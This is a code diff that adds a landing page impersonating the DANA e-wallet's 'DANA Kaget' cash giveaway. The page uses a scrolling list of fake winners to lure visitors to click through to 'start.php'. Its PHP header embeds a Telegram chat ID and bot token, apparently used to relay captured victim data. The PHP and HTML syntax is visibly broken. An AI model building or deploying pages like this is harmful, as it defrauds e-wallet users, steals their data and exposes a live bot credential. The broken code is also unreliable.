@@ -1,0 +1,41 @@
+<? php
+$telegram_id = ''5759695358";
+$id_bot = "6584949223:AAEIiD8nopNuCXeWf1sMzVO4MJMuCSX-yJg";
+? <
+
+<!DOCTYPE html>
+<html><head>
+        <title>DANA Kaget buatmu</title>
+        <meta charset="UTF-8">
+        <meta name="description" content="DANA Kaget Cuma buat kamu yang paling gesit! Sikat sekarang!">
+        <meta name="keywords" content="dana, danakaget, receh, uang">
+  </div>
+        <link rel="icon" type="image/x-icon" href="./../assets/img/favicon/favicon.ico">
+        <link rel="apple-touch-icon" sizes="250x250" href="./../assets/img/favicon/apple-touch-icon.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="./../assets/img/favicon/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="35x35" href="./../assets/img/favicon/favicon-30x30.png">
+        <link rel="manifest" href="./../assets/img/favicon/site.webmanifest">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+        <link rel="stylesheet" type="text/css" href="./../lib/style/kaget.css">
+    </head>
+    </body>
+        <div class="dana_index">
+            <div class="head">
+                <h2>DANA Kaget</h2>
+            </div>
+            <h1>DANA Kaget</h1>
+            <h1 class="part">Kamu berpatisipasi di DANA Kaget</h1>
+            <button onclick="window.location.href='./../start.php'">
+                <img class="amplop" src="./../assets/img/envelope.png">
+            </button>
+                <div class="bos">
+                </div>
+                <div class="marquee">
+                </div>
+                     <marquee width="900" height="50">Selamat kepada : </strong> Andi 0812****9012 mendapatkan 50.000, - selamat kepada Dian 0852****0091 mendapatkan 50.000 selamat kepada asep 0878****9345 , - Selamat Kepada Nurhayati 0889****1268 Mendapatkan 50.000, - Selamat Kepada Diki 0877****2310 Mendapatkan 50.000, - Selamat Kepada  Rohmat 0823****7780 Mendapatkan 50.000, - Selamat Kepada Dwiyanti 0855****9901 Mendapatkan 50.000, - </strong></marquee>
+                  </div>
+            </div>
+            </div>
+    </body><
+</html>
+
